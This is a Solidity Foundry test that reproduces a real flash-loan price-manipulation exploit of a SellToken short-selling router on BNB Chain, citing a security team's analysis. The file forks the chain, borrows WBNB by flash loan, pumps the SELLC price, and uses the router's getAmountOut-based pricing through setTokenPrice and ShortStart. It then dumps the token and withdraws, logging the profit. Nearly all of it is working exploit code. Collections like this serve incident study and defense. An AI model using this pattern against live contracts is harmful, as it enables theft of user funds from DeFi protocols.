// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1657324561577435136
// @TX
// https://explorer.phalcon.xyz/tx/bsc/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a
// @Summary
// Just use `getAmountOut` as token price

interface ISellTokenRouter {
    function ShortStart(address coin, address addr, uint256 terrace) external payable;
    function withdraw(address token) external;
    function setTokenPrice(address _token) external;
    function getToken2Price(address token, address bnbOrUsdt, uint256 bnb) external returns (uint256);
}

contract SellTokenExp is Test, IDODOCallee {
    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ISellTokenRouter s_router = ISellTokenRouter(0x57Db19127617B77c8abd9420b5a35502b59870D6);
    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
    IPancakeRouter p_router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_168_034);
        deal(address(wbnb), address(this), 10 ether);
        payable(0x0).transfer(address(this).balance);
    }

    function testExp() external {
        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes("a123456789012345678901234567890"));
        vm.warp(block.timestamp + 100);

        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes("abc"));

        emit log_named_decimal_uint("WBNB total profit", wbnb.balanceOf(address(this)) - 10 ether, 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        uint256 balance = wbnb.balanceOf(address(this));
        if (data.length > 20) {
            balance -= 10 ether;
        }
        //emit log_named_decimal_uint("WBNB before", wbnb.balanceOf(address(this)), 18);
        uint256 swap_balance = balance * 99 / 100;
        uint256 short_balance = balance - swap_balance;
        wbnb.withdraw(short_balance);
        // 1. lift price
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(SELLC);
        wbnb.approve(address(p_router), type(uint256).max);
        SELLC.approve(address(p_router), type(uint256).max);
        //emit log_named_decimal_uint("SELLC price before", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
        p_router.swapExactTokensForTokens(swap_balance, 0, path, address(this), block.timestamp + 1000);
        //emit log_named_decimal_uint("swap_balance:  ", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);

        // 2. short SELLC
        if (data.length > 20) {
            s_router.setTokenPrice(address(SELLC));
            //emit log_named_decimal_uint("SELLC price before", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
        } else {
            //emit log_named_decimal_uint("SELLC price after", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
            s_router.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);
        }

        // 3. drop price
        path[0] = address(SELLC);
        path[1] = address(wbnb);
        p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
        //emit log_named_decimal_uint("WBNB after", wbnb.balanceOf(address(this)), 18);
        //emit log_named_decimal_uint("SELLC price after", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);
        // 4. end short
        if (data.length < 20) {
            s_router.withdraw(address(SELLC));
            wbnb.deposit{value: address(this).balance}();
            wbnb.transfer(address(oracle1), balance);
            //emit log_named_decimal_uint("WBNB profit this time", wbnb.balanceOf(address(this)), 18);
        } else {
            wbnb.deposit{value: address(this).balance}();
            wbnb.transfer(address(oracle1), balance);
            emit log_named_decimal_uint("WBNB cost first", 10 ether - wbnb.balanceOf(address(this)), 18);
        }
    }

    receive() external payable {}
}
